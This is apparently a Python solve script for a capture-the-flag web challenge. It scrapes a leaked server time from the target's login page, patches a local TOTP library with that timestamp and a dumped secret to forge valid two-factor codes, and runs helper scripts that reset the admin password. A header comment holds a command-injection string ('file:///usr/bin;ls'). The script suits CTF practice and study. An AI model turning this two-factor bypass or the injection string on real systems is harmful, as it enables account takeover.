# file:///usr/bin;ls

import time
import requests
import os


class TOTP_Gen(object):
    def __init__(self):
        self.ctf_url = input("Paste CTF URL here: ")
    
    def get_leaked_data(self):
        req = requests.get(url=f"{self.ctf_url}/login.php")
        leaked_time_string = req.text.split(' 12px;">')[1].split('<')[0].strip().rstrip()

        print(f"[ *** Leaked time data {leaked_time_string} *** ]")

        data = open("timestamp_gen.php", 'r').read()
        data = data.replace(r'{{LEAKED_DATE_HERE}}', leaked_time_string)

        with open('timestamp_gen.php', 'w') as f:
            f.write(data)


    def get_timestamp_int(self):
        req = requests.get("http://localhost:9000/timestamp_gen.php")
        timestamp_int = int(req.text.strip().rstrip())
        return timestamp_int

    def patch_timestamp_int(self, timestamp_int):
        timestamp_int = self.get_timestamp_int()
        
        input(f"timestamp_int: {timestamp_int}")

        data = open("vendor/spomky-labs/otphp/src/TOTP.php", 'r').read()
        data = data.replace(r"{{REPLACE_TIMESTAMP_INT_HERE}}", f"{timestamp_int}")

        with open("vendor/spomky-labs/otphp/src/TOTP.php", 'w') as f:
            f.write(data)
    def main(self):
        totp_secret = input("paste secret: ").strip().rstrip()
        data = open("print_TOTP.php", 'r').read()
        data = data.replace(r'{{LEAKED_TOTP_SECRET_HERE}}', totp_secret)
        
        with open('print_TOTP.php', 'w') as f:
            f.write(data)

        self.get_leaked_data()
        timestamp_int = self.get_timestamp_int()
        self.patch_timestamp_int(timestamp_int)

        generated_totp_code = requests.get("http://localhost:9000/print_TOTP.php").text
        print(f"[ *** GENERATED TOTP CODE \'{generated_totp_code}\' *** ]")


if __name__ == "__main__":
    print(f"[ Reverting Files... ]")
    os.system("python3 ./revert.py")
    print(f"[ Changing Admin Creds... ]")
    os.system(f"python3 ./reset_adm_passwd.py")

    print(f"[ Dumping TOTP key ]")
    os.system("python3 ./dump_secret.py")

    obj = TOTP_Gen()
    obj.main()


# ELKHF3X


